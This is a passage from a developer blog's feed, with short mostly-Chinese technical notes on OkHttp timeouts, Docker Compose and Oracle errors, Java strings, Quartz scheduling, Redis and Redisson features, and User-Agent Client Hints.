<h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">OkHttp is an HTTP client that’s efficient by default:</span><br><span class="line"></span><br><span class="line">1.HTTP/2 support allows all requests to the same host to share a socket.</span><br><span class="line">2.Connection pooling reduces request latency (<span class="keyword">if</span> HTTP/2 isn’t available).</span><br><span class="line">3.Transparent GZIP shrinks download sizes.</span><br><span class="line">4.Response caching avoids the network completely <span class="keyword">for</span> repeat requests.</span><br><span class="line"></span><br><span class="line">Using OkHttp is easy. Its request/response API is designed with fluent builders and immutability.</span><br><span class="line">It supports both synchronous blocking calls and async calls with callbacks.</span><br></pre></td></tr></table></figure>

<h3 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">OkHttp works on Android 5.0+ (API level 21+) and Java 8+.</span><br><span class="line"></span><br><span class="line">OkHttp depends on Okio <span class="keyword">for</span> high-performance I/O and the Kotlin standard library.</span><br><span class="line">Both are small libraries with strong backward-compatibility.</span><br><span class="line"></span><br><span class="line">We highly recommend you keep OkHttp up-to-date. As with auto-updating web browsers,</span><br><span class="line">staying current with HTTPS clients is an important defense against potential security problems.</span><br><span class="line">We track the dynamic TLS ecosystem and adjust OkHttp to improve connectivity and security.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>OKHttp</category>
      </categories>
      <tags>
        <tag>OKHttp</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro No Configuration File Provided Not Found For Docker Compose</title>
    <url>/posts/8a5851d8/</url>
    <content><![CDATA[<h3 id="Intro-No-Configuration-File-Provided-Not-Found-For-Docker-Compose"><a href="#Intro-No-Configuration-File-Provided-Not-Found-For-Docker-Compose" class="headerlink" title="Intro No Configuration File Provided Not Found For Docker Compose"></a>Intro No Configuration File Provided Not Found For Docker Compose</h3><span id="more"></span>
<p>這篇介紹No Configuration File Provided Not Found For Docker Compose。</p>
<h3 id="執行docker-compose指令"><a href="#執行docker-compose指令" class="headerlink" title="執行docker-compose指令"></a>執行docker-compose指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">當執行docker-compose指令時，出現no configuration file provided: not found訊息。</span><br><span class="line">原因是執行時該路徑不包含docker-compose.yml設定造成。</span><br><span class="line">請移至有docker-compose.yml設定的路徑下執行該指令。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>DockerCompose</category>
      </categories>
      <tags>
        <tag>DockerCompose</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro OKHttp Parameter CallTimeOut</title>
    <url>/posts/e9f4c611/</url>
    <content><![CDATA[<h2 id="Intro-OKHttp-Parameter-CallTimeOut"><a href="#Intro-OKHttp-Parameter-CallTimeOut" class="headerlink" title="Intro OKHttp Parameter CallTimeOut"></a>Intro OKHttp Parameter CallTimeOut</h2><span id="more"></span>
<p>這篇介紹OKHttp Parameter CallTimeOut.</p>
<h2 id="官方說明"><a href="#官方說明" class="headerlink" title="官方說明:"></a>官方說明:</h2><p>Sets the default timeout for complete calls. </p>
<p>A value of 0 means no timeout, otherwise values must be </p>
<p>between 1 and Integer.MAX_VALUE when converted to milliseconds.</p>
<p>The call timeout spans the entire call: resolving DNS, connecting,</p>
<p>writing the request body, server processing, and reading the response body.</p>
<p>If the call requires redirects or retries all must complete within one timeout period.</p>
<p>The default value is 0 which imposes no timeout.</p>
<h2 id="使用情境-amp-解決方法"><a href="#使用情境-amp-解決方法" class="headerlink" title="使用情境 &amp; 解決方法:"></a>使用情境 &amp; 解決方法:</h2><p>一般在使用OKHttp時，經常會設定connectionTimeout和readTimeout及writeTimeout。</p>
<p>這次碰到當對方回應，”java.io.IOException: unexpected end of stream on {對方domain}”</p>
<p>代表有可能被對方CDN誤判成有問題的domain，故意不斷線且不會受到connectionTimeout、</p>
<p>readTimeout、writeTimeout條件造成timeout。</p>
<p>所以必須設定callTimeout Parameter來防止HTTP request沒有timeout而一直佔用執行緒問題。</p>
]]></content>
      <categories>
        <category>OKHttp</category>
      </categories>
      <tags>
        <tag>OKHttp</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro ORA-01461 can bind a LONG value only for insert into a LONG column</title>
    <url>/posts/edf4fea3/</url>
    <content><![CDATA[<h3 id="Intro-ORA-01461-can-bind-a-LONG-value-only-for-insert-into-a-LONG-column"><a href="#Intro-ORA-01461-can-bind-a-LONG-value-only-for-insert-into-a-LONG-column" class="headerlink" title="Intro ORA-01461 can bind a LONG value only for insert into a LONG column"></a>Intro ORA-01461 can bind a LONG value only for insert into a LONG column</h3><span id="more"></span>
<p>這篇介紹ORA-01461 can bind a LONG value only for insert into a LONG column.</p>
<h3 id="ORA-01461-can-bind-a-LONG-value-only-for-insert-into-a-LONG-column"><a href="#ORA-01461-can-bind-a-LONG-value-only-for-insert-into-a-LONG-column" class="headerlink" title="ORA-01461 can bind a LONG value only for insert into a LONG column"></a>ORA-01461 can bind a LONG value only for insert into a LONG column</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在執行update sql at oracle時，出現ORA-01461: can <span class="built_in">bind</span> a LONG value only</span><br><span class="line"><span class="keyword">for</span> insert into a LONG column錯誤訊息。</span><br><span class="line">經查發現是有個欄位的值超過VARCHAR2(4000)導致，</span><br><span class="line">解決方法是增加該欄位length是否超過欄位長度上限檢核。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Oracle</tag>
        <tag>ORA-01461</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Predicate And strip And Indent</title>
    <url>/posts/99f4289/</url>
    <content><![CDATA[<h3 id="Intro-Predicate-And-strip-And-Indent"><a href="#Intro-Predicate-And-strip-And-Indent" class="headerlink" title="Intro Predicate And strip And Indent"></a>Intro Predicate And strip And Indent</h3><span id="more"></span>
<p>這篇介紹Predicate And strip And Indent。</p>
<h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">去空白 去\n 加入空格</span><br><span class="line"></span><br><span class="line">String <span class="built_in">test</span> = <span class="string">&quot;\nPretius\n rules\n  all!&quot;</span>;</span><br><span class="line">List&lt;String&gt; list = test.repeat(10).lines().filter(Predicate.not(String::isBlank))</span><br><span class="line">	.map(String::strip)</span><br><span class="line">	.map(s -&gt; s.indent(2)).collect(Collectors.toList());</span><br><span class="line">	</span><br><span class="line">list.stream().forEach(x -&gt; &#123;</span><br><span class="line">	System.out.println(x);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"></span><br><span class="line">  Pretius</span><br><span class="line"></span><br><span class="line">  rules</span><br><span class="line"></span><br><span class="line">  all!</span><br><span class="line"></span><br><span class="line">  Pretius</span><br><span class="line"></span><br><span class="line">  rules</span><br><span class="line"></span><br><span class="line">  all!</span><br><span class="line"></span><br><span class="line">  Pretius</span><br><span class="line"></span><br><span class="line">  rules</span><br><span class="line"></span><br><span class="line">  all!</span><br><span class="line"></span><br><span class="line">  Pretius</span><br><span class="line"></span><br><span class="line">  rules</span><br><span class="line"></span><br><span class="line">  all!</span><br><span class="line"></span><br><span class="line">  Pretius</span><br><span class="line"></span><br><span class="line">  rules</span><br><span class="line"></span><br><span class="line">  all!</span><br><span class="line"></span><br><span class="line">  Pretius</span><br><span class="line"></span><br><span class="line">  rules</span><br><span class="line"></span><br><span class="line">  all!</span><br><span class="line"></span><br><span class="line">  Pretius</span><br><span class="line"></span><br><span class="line">  rules</span><br><span class="line"></span><br><span class="line">  all!</span><br><span class="line"></span><br><span class="line">  Pretius</span><br><span class="line"></span><br><span class="line">  rules</span><br><span class="line"></span><br><span class="line">  all!</span><br><span class="line"></span><br><span class="line">  Pretius</span><br><span class="line"></span><br><span class="line">  rules</span><br><span class="line"></span><br><span class="line">  all!</span><br><span class="line"></span><br><span class="line">  Pretius</span><br><span class="line"></span><br><span class="line">  rules</span><br><span class="line"></span><br><span class="line">  all!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Predicate</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro PuTTY Protocol Options</title>
    <url>/posts/acb3e81b/</url>
    <content><![CDATA[<h3 id="Intro-PuTTY-Protocol-Options"><a href="#Intro-PuTTY-Protocol-Options" class="headerlink" title="Intro PuTTY Protocol Options"></a>Intro PuTTY Protocol Options</h3><span id="more"></span>
<p>這篇介紹透過PuTTY Protocol Options的設定，讓跳板機輸入完Verification code後不會往下登入。</p>
<h3 id="Intro-PuTTY-Protocol-Options-1"><a href="#Intro-PuTTY-Protocol-Options-1" class="headerlink" title="Intro PuTTY Protocol Options"></a>Intro PuTTY Protocol Options</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">設定的位置</span><br><span class="line">Category: -&gt; Connection -&gt; SSH -&gt; Don<span class="string">&#x27;t start a shell or command at all 打勾</span></span><br></pre></td></tr></table></figure>
<img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/PuttyProtocolOptions.PNG" width="50%" />]]></content>
      <categories>
        <category>PuTTY</category>
      </categories>
      <tags>
        <tag>Setting</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Quartz Versus FixedRate Versus FixedDelay</title>
    <url>/posts/51816722/</url>
    <content><![CDATA[<h3 id="Intro-Quartz-Versus-FixedRate-Versus-FixedDelay"><a href="#Intro-Quartz-Versus-FixedRate-Versus-FixedDelay" class="headerlink" title="Intro Quartz Versus FixedRate Versus FixedDelay"></a>Intro Quartz Versus FixedRate Versus FixedDelay</h3><span id="more"></span>
<p>這篇介紹Quartz Versus FixedRate Versus FixedDelay.</p>
<h3 id="Compare"><a href="#Compare" class="headerlink" title="Compare"></a>Compare</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在使用quartz做排程時，</span><br><span class="line">要注意在job class的定義上必須加上</span><br><span class="line">@DisallowConcurrentExecution的annotation，才不會一直重複執行。</span><br><span class="line"></span><br><span class="line">以每秒排程為例</span><br><span class="line">有加@DisallowConcurrentExecution -&gt; 會等該job執行完才會進行下一個schedule</span><br><span class="line">沒加@DisallowConcurrentExecution -&gt; 不會等該job執行完，在每秒繼續執行下一個schedule</span><br><span class="line"></span><br><span class="line">quartz和ScheduleAtFixedRate or ScheduleWithFixedDelay建議使用情境:</span><br><span class="line">1.quartz用在固定時間的排程使用 ex.每天中午12點執行一次排程</span><br><span class="line">2.ScheduleAtFixedRate or ScheduleWithFixedDelay:</span><br><span class="line">  rate:等待rate時間就執行task</span><br><span class="line">  delay:該task執行完後，delay設定時間再繼續執行下一個task</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Schedule</category>
      </categories>
      <tags>
        <tag>Schedule</tag>
        <tag>Quartz</tag>
        <tag>ScheduleAtFixedRate</tag>
        <tag>ScheduleWithFixedDelay</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Redis DataStructure</title>
    <url>/posts/35563c23/</url>
    <content><![CDATA[<h3 id="Intro-Redis-DataStructure"><a href="#Intro-Redis-DataStructure" class="headerlink" title="Intro Redis DataStructure"></a>Intro Redis DataStructure</h3><span id="more"></span>
<p>這篇將介紹Redis的幾個dataStructure。</p>
<h3 id="INCRBY-key-integer"><a href="#INCRBY-key-integer" class="headerlink" title="INCRBY key integer"></a>INCRBY key integer</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">TIME COMPLEXITY: O(1)</span><br><span class="line"></span><br><span class="line">DESCRIPTION: Increment or decrement the number stored at key by one. If the key does not exist or contains a value of a wrong <span class="built_in">type</span>, <span class="built_in">set</span> the key to the value of <span class="string">&quot;0&quot;</span> before to perform the increment or decrement operation.</span><br><span class="line"></span><br><span class="line">INCRBY and DECRBY work just like INCR and DECR but instead to increment/decrement by 1 the increment/decrement is <span class="built_in">integer</span>.</span><br><span class="line"></span><br><span class="line">INCR commands are limited to 64 bit signed integers.</span><br><span class="line"></span><br><span class="line">RETURN VALUE: Integer reply, this commands will reply with the new value of key after the increment or decrement.</span><br></pre></td></tr></table></figure>

<h3 id="HMSET-key-field-value-field-value-…"><a href="#HMSET-key-field-value-field-value-…" class="headerlink" title="HMSET key field value [field value …]"></a>HMSET key field value [field value …]</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">TIME COMPLEXITY: O(N) <span class="built_in">where</span> N is the number of fields being <span class="built_in">set</span>.</span><br><span class="line"></span><br><span class="line">DESCRIPTION: Sets the specified fields to their respective values <span class="keyword">in</span> the <span class="built_in">hash</span> stored at key. This <span class="built_in">command</span> overwrites any existing fields <span class="keyword">in</span> the <span class="built_in">hash</span>. If key does not exist, a new key holding a <span class="built_in">hash</span> is created.</span><br><span class="line"></span><br><span class="line">RETURN VALUE: Status code reply</span><br></pre></td></tr></table></figure>

<h3 id="SPOP-key"><a href="#SPOP-key" class="headerlink" title="SPOP key"></a>SPOP key</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">TIME COMPLEXITY: O(1)</span><br><span class="line"></span><br><span class="line">DESCRIPTION: Remove a random element from a Set returning it as <span class="built_in">return</span> value. If the Set is empty or the key does not exist, a nil object is returned.</span><br><span class="line"></span><br><span class="line">The SRANDMEMBER <span class="built_in">command</span> does a similar work but the returned element is not removed from the Set.</span><br><span class="line"></span><br><span class="line">RETURN VALUE: Bulk reply</span><br></pre></td></tr></table></figure>

<h3 id="LPUSH-key-string"><a href="#LPUSH-key-string" class="headerlink" title="LPUSH key string"></a>LPUSH key string</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">TIME COMPLEXITY: O(1)</span><br><span class="line"></span><br><span class="line">DESCRIPTION: Add the string value to the <span class="built_in">head</span> (RPUSH) or <span class="built_in">tail</span> (LPUSH) of the list stored at key. If the key does not exist an empty list is created just before the append operation. </span><br><span class="line">If the key exists but is not a List an error is returned.</span><br><span class="line"></span><br><span class="line">RETURN VALUE: Status code reply</span><br></pre></td></tr></table></figure>

<h3 id="LLEN-key"><a href="#LLEN-key" class="headerlink" title="LLEN key"></a>LLEN key</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">TIME COMPLEXITY: O(1)</span><br><span class="line"></span><br><span class="line">DESCRIPTION: Return the length of the list stored at the specified key. If the key does not exist zero is returned (the same behaviour as <span class="keyword">for</span> empty lists). </span><br><span class="line">If the value stored at key is not a list an error is returned.</span><br><span class="line"></span><br><span class="line">RETURN VALUE: Integer reply of the length of the list.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>DataStructure</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Redis Sentinel</title>
    <url>/posts/5edfe5e3/</url>
    <content><![CDATA[<h3 id="Intro-Redis-Sentinel"><a href="#Intro-Redis-Sentinel" class="headerlink" title="Intro Redis Sentinel"></a>Intro Redis Sentinel</h3><span id="more"></span>
<p>這篇介紹Redis Sentinel.</p>
<h3 id="基本原理和概念"><a href="#基本原理和概念" class="headerlink" title="基本原理和概念"></a>基本原理和概念</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.定時任務:每個Sentinel Node都有3個定時任務，通過這些任務可以發現增刪的 Node和狀態。其任務如下:</span><br><span class="line">    a.通過向Master-Slave Node發送 info 命令獲取最新的Master-Slave結構</span><br><span class="line">    b.通過發布訂閱功能獲取其它Sentinel Node的資訊</span><br><span class="line">    c.通過向其它 Node發送ping命令進行心跳檢測，判斷 Node是否下線</span><br><span class="line">	</span><br><span class="line">2.主觀下線和客觀下線</span><br><span class="line">	主觀下線:在心跳檢測的定時任務中，如果其他 Node超過一定時間沒有回覆，</span><br><span class="line">	當前的Sentinel Node就會主觀地將其認定為主觀下線(該 Node不可用)</span><br><span class="line">	客觀下線:Sentinel Node對Master Node進行Master觀下線後，會通過 sentinel is-master-down-by-addr </span><br><span class="line">	命令詢問其它Sentinel Node該Master Node的狀態；如果判斷Master Node下線的Sentinel數量達到一定數值，</span><br><span class="line">	則對該Master Node認定為客觀下線(該 Node不可用)</span><br><span class="line"></span><br><span class="line">3.Sentinel領導者選舉:</span><br><span class="line">	當Master Node被判斷客觀下線以後，各個Sentinel Node會選出一個Sentinel Node領導者，並由該領導者 Node進行Failover操作</span><br><span class="line"></span><br><span class="line">4.Failover:</span><br><span class="line">    a. 在Slave Node中選擇新的Master Node：先過濾掉不健康的Slave Node，接著選擇的原則(順序)是</span><br><span class="line">        i.   選擇 slave-priority 優先級最高的Slave Node</span><br><span class="line">        ii.  選擇複製偏移量最大的Slave Node</span><br><span class="line">        iii. 選擇 runid 最小(最早啟動)的Slave Node</span><br><span class="line"></span><br><span class="line">    b. 更新Master-Slave狀態:</span><br><span class="line">        新的Master Node選出後，會將其餘的 Node更新為此新Master Node的Slave Node；另外若原先的Master Node重新上線後，會成為此新Master Node的Slave Node</span><br><span class="line"></span><br><span class="line">    c. 通知客戶端:</span><br><span class="line">         Node狀態更新後， sentinel 會通知客戶端 Node變更訊息，客戶端也會重新連結到新的Master Node</span><br><span class="line"></span><br><span class="line">經由上述幾個的概念，我們可以大致上了解工作原理。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redisson</category>
      </categories>
      <tags>
        <tag>Redisson</tag>
        <tag>Sentinel</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Redis Distributed Lock On RedisCluster</title>
    <url>/posts/29d6331a/</url>
    <content><![CDATA[<h3 id="Intro-Redis-Distributed-Lock-On-RedisCluster"><a href="#Intro-Redis-Distributed-Lock-On-RedisCluster" class="headerlink" title="Intro Redis Distributed Lock On RedisCluster"></a>Intro Redis Distributed Lock On RedisCluster</h3><span id="more"></span>
<p>這篇介紹Redis Distributed Lock On RedisCluster。</p>
<h3 id="使用上會遇到的問題"><a href="#使用上會遇到的問題" class="headerlink" title="使用上會遇到的問題"></a>使用上會遇到的問題</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在Redis上使用分散式鎖，是很常見的功能。</span><br><span class="line">在single redis上，分散式鎖是正常可用的。</span><br><span class="line"></span><br><span class="line">Redis高可用最常見的方案就是RedisCluster（master-slave），</span><br><span class="line">這種模式在redis分散式鎖有缺陷。</span><br><span class="line"></span><br><span class="line">redis cluster叢集環境下，假如現在A使用者端想要加鎖，它會根據路由規則</span><br><span class="line">選擇一臺master節點寫入key mylock，在加鎖成功後，master節點會把key非同</span><br><span class="line">步複製給對應的slave節點。</span><br><span class="line"></span><br><span class="line">如果此時redis master節點當機從節點複製失敗，為保證叢集可用性，會進行</span><br><span class="line">主備切換，slave變為了redis master。B使用者在新的master節點上加鎖成功</span><br><span class="line">，而A使用者也以為自己還是成功加了鎖的。另外如果主從複製延遲同樣也會</span><br><span class="line">造成加鎖和解鎖延遲的問題。</span><br><span class="line"></span><br><span class="line">此時就會導致同一時間內多個使用者端對一個分散式鎖完成了加鎖，導致各種</span><br><span class="line">髒資料的產生。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
        <tag>Distributed Lock</tag>
        <tag>RedisCluster</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Producer Consumer Mode Advantage I</title>
    <url>/posts/341d1e6f/</url>
    <content><![CDATA[<h3 id="Intro-Producer-Consumer-Mode-Advantage"><a href="#Intro-Producer-Consumer-Mode-Advantage" class="headerlink" title="Intro Producer Consumer Mode Advantage"></a>Intro Producer Consumer Mode Advantage</h3><span id="more"></span>
<p>這篇介紹Producer Consumer Mode Advantage。</p>
<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Producer -&gt; Buffer -&gt; Consumer</span><br><span class="line"></span><br><span class="line">Producer Consumer模式在軟體專案開發很常運用在現實情境。</span><br><span class="line">為什麼不讓Consumer直接使用Producer的資源呢? 還要特別建立</span><br><span class="line">Buffer區!</span><br><span class="line"></span><br><span class="line">要介紹以下幾個優點:</span><br><span class="line">1.Decoupling(解耦) : 增加Buffer區是為了不讓Producer、Consumer</span><br><span class="line">互相依賴，若沒有Buffer區則Consumer的代碼修改，可能會影響到Producer。</span><br><span class="line">在兩者依賴於Buffer區，不互相依賴的話，相對耦合也降低。</span><br><span class="line"></span><br><span class="line">2.Concurrency(併發) : 若Producer直接呼叫Consumer的方法，由於call <span class="keyword">function</span>是</span><br><span class="line">Synchronize，在Consumer尚未<span class="built_in">return</span>之前，Producer只能一直等待。萬一Consumer</span><br><span class="line">處理很慢，Producer則會浪費時間去等待。</span><br><span class="line">增加Buffer區，可將Producer和Consumer視為獨立的併發主體，Producer把產生的data往</span><br><span class="line">Buffer區送，就可以繼續產生下一個data，而不用依賴Consumer的資料處理速度。</span><br><span class="line"></span><br><span class="line">3.Support busy time : 增加Buffer區其中一個好處是，若產生data的速度時快時慢，當</span><br><span class="line">data產生快時，Consumer會來不及處理，這些未處理的data將暫存在Buffer區。等Producer</span><br><span class="line">產生的速度慢下來時，Consumer會慢慢處理消化data。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
      <tags>
        <tag>DesignPattern</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Redisson Sharded Topic</title>
    <url>/posts/84c89632/</url>
    <content><![CDATA[<h3 id="Intro-Redisson-Sharded-Topic"><a href="#Intro-Redisson-Sharded-Topic" class="headerlink" title="Intro Redisson Sharded Topic"></a>Intro Redisson Sharded Topic</h3><span id="more"></span>
<p>這篇介紹Redisson Sharded Topic。</p>
<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Java implementation of Redis based RShardedTopic object implements Sharded Publish / Subscribe mechanism.</span><br><span class="line">It allows to subscribe on events published with multiple instances of RShardedTopic object with the same name.</span><br><span class="line">Subscribe/publish operations are executed only on Redis node <span class="keyword">in</span> Cluster <span class="built_in">which</span> is bounded to specific topic name. </span><br><span class="line"></span><br><span class="line">Published messages via RShardedTopic aren<span class="string">&#x27;t broadcasted across all Redis nodes as for RTopic object. </span></span><br><span class="line"><span class="string">Which reduces network bandwidth and Redis load.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Listeners are re-subscribed automatically after reconnection to Redis or Redis failover. </span></span><br><span class="line"><span class="string">All messages sent during absence of connection to Redis are lost. Use Reliable Topic for reliable delivery.</span></span><br></pre></td></tr></table></figure>

<h3 id="Code-example"><a href="#Code-example" class="headerlink" title="Code example"></a>Code example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">RShardedTopic topic = redisson.getShardedTopic(<span class="string">&quot;myTopic&quot;</span>);</span><br><span class="line">int listenerId = topic.addListener(SomeObject.class, new MessageListener&lt;SomeObject&gt;() &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void onMessage(String channel, SomeObject message) &#123;</span><br><span class="line">        //...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// <span class="keyword">in</span> other thread or JVM</span><br><span class="line">RShardedTopic topic = redisson.getShardedTopic(<span class="string">&quot;myTopic&quot;</span>);</span><br><span class="line">long clientsReceivedMessage = topic.publish(new SomeObject());</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redisson</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Redisson RLock lock Versus tryLock</title>
    <url>/posts/a9670a2c/</url>
    <content><![CDATA[<h3 id="Intro-Redisson-RLock-lock-Versus-tryLock"><a href="#Intro-Redisson-RLock-lock-Versus-tryLock" class="headerlink" title="Intro Redisson RLock lock Versus tryLock"></a>Intro Redisson RLock lock Versus tryLock</h3><span id="more"></span>
<p>這篇介紹Redisson RLock lock Versus tryLock.</p>
<h3 id="適合使用情境"><a href="#適合使用情境" class="headerlink" title="適合使用情境"></a>適合使用情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1.RLock.lock();</span><br><span class="line">適合用在每個執行緒必定要完成該task，其它執行緒會<span class="built_in">wait</span>且照進來的順序。</span><br><span class="line"></span><br><span class="line">2.RLock.tryLock();</span><br><span class="line">適合用在只有一個執行緒需要完成該task，其它執行緒不會<span class="built_in">wait</span>，拿不到鎖就直接結束。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redisson</category>
      </categories>
      <tags>
        <tag>Redisson</tag>
        <tag>RLock</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Request Detailed Data With User Agent Client Hints</title>
    <url>/posts/1e1fd690/</url>
    <content><![CDATA[<h2 id="Intro-Request-Detailed-Data-With-User-Agent-Client-Hints"><a href="#Intro-Request-Detailed-Data-With-User-Agent-Client-Hints" class="headerlink" title="Intro Request Detailed Data With User Agent Client Hints"></a>Intro Request Detailed Data With User Agent Client Hints</h2><span id="more"></span>
<p>這篇介紹Request Detailed Data With User Agent Client Hints。</p>
<h2 id="User-Agent-Client-Hints"><a href="#User-Agent-Client-Hints" class="headerlink" title="User Agent Client Hints:"></a>User Agent Client Hints:</h2><p>繼上一篇Chrome110開始提供固定的GA內容，但實務上使用會需要詳細的資訊來應用在各種產品或分析上。<br>故可以使用User-Agent Client Hints (UA-CH) API透過HTTP headers 或 JavaScript來取得資料。</p>
<p>You may have already seen the default headers being sent with the Sec-CH-UA- prefix that tells you the browser,<br>its major version, the operating system, and if the browser is a mobile device.</p>
<h2 id="Default-User-Agent-Client-Hints-request-headers-from-Chrome"><a href="#Default-User-Agent-Client-Hints-request-headers-from-Chrome" class="headerlink" title="Default User-Agent Client Hints request headers from Chrome:"></a>Default User-Agent Client Hints request headers from Chrome:</h2><p>Sec-CH-UA: “Chromium”;v&#x3D;”110”, “Not A(Brand”;v&#x3D;”24”, “Google Chrome”;v&#x3D;”110”<br>Sec-CH-UA-Mobile: ?1<br>Sec-CH-UA-Platform: “Android”</p>
<p>You can use the Accept-CH header in your response to ask for more data. In this case, you can ask for<br>Sec-CH-UA-Platform-Version and Sec-CH-UA-Model to get that Android version and device type back in subsequent requests.</p>
<h2 id="Response-header-from-your-server-specifying-platform-version-and-model"><a href="#Response-header-from-your-server-specifying-platform-version-and-model" class="headerlink" title="Response header from your server specifying platform version and model:"></a>Response header from your server specifying platform version and model:</h2><h2 id="Accept-CH-Sec-CH-UA-Platform-Version-Sec-CH-UA-ModelRequest-headers-back-from-Chrome-including-Android-version-and-model-name"><a href="#Accept-CH-Sec-CH-UA-Platform-Version-Sec-CH-UA-ModelRequest-headers-back-from-Chrome-including-Android-version-and-model-name" class="headerlink" title="Accept-CH:  Sec-CH-UA-Platform-Version,  Sec-CH-UA-ModelRequest headers back from Chrome including Android version and model name:"></a>Accept-CH:<br>  Sec-CH-UA-Platform-Version,<br>  Sec-CH-UA-Model<br><br>Request headers back from Chrome including Android version and model name:</h2><p>Sec-CH-UA-Platform-Version: “13.0.0”<br>Sec-CH-UA-Model: “Pixel 7”</p>
<h2 id="You-can-do-the-same-thing-in-JavaScript-by-calling-getHighEntropyValues-on-the-userAgentData-API-passing-in-an-arrayof-the-values-you-want-platformVersion-and-model-This-returns-a-promise-with-an-object-containing-the-specific-values"><a href="#You-can-do-the-same-thing-in-JavaScript-by-calling-getHighEntropyValues-on-the-userAgentData-API-passing-in-an-arrayof-the-values-you-want-platformVersion-and-model-This-returns-a-promise-with-an-object-containing-the-specific-values" class="headerlink" title="You can do the same thing in JavaScript by calling getHighEntropyValues() on the userAgentData API, passing in an arrayof the values you want: platformVersion and model. This returns a promise with an object containing the specific values."></a>You can do the same thing in JavaScript by calling getHighEntropyValues() on the userAgentData API, passing in an array<br>of the values you want: platformVersion and model. This returns a promise with an object containing the specific values.</h2><p>navigator.userAgentData<br> .getHighEntropyValues(<br>   [‘platformVersion’, ‘model’]<br> ).then(ua &#x3D;&gt; { console.log(ua)<br> });</p>
<p>{<br>  “platformVersion”: “13.0.0”,<br>  “model”: “Pixel 7”<br>}</p>
]]></content>
      <categories>
        <category>Chrome</category>
      </categories>
      <tags>
        <tag>Chrome</tag>
        <tag>Google</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Response About Meta Name Robots Content Noindex NoFollow</title>
    <url>/posts/df31c2c7/</url>
    <content><![CDATA[<h3 id="Intro-Response-About-Meta-Name-Robots-Content-Noindex-NoFollow"><a href="#Intro-Response-About-Meta-Name-Robots-Content-Noindex-NoFollow" class="headerlink" title="Intro Response About Meta Name Robots Content Noindex NoFollow"></a>Intro Response About Meta Name Robots Content Noindex NoFollow</h3><span id="more"></span>
<p>這篇介紹Response About Meta Name Robots Content Noindex NoFollow.</p>
